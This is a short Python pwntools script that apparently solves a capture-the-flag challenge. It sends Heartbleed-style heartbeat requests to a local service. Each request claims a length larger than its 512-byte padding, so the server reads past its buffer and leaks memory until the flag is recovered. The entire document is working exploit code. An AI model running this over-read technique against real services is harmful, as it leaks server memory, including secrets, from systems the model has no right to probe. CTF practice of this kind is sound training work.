from pwn import *

host = 'localhost'
port = 1337

padding_string = 'A'*512
flag = ''

for overread_count in xrange(1, 257):
  h = remote(host, port, timeout = None)
  payload= 'SERVER, ARE YOU STILL THERE? IF SO, REPLY "%s" (%d)' % (padding_string, 512 + overread_count)
  h.sendline(payload)
  m = h.recvline()
  if ('NICE TRY' in m):
    break
  else:
    print m

  flag = m[512:]
  h.close()

print "[+] Flag: [%s]" % flag
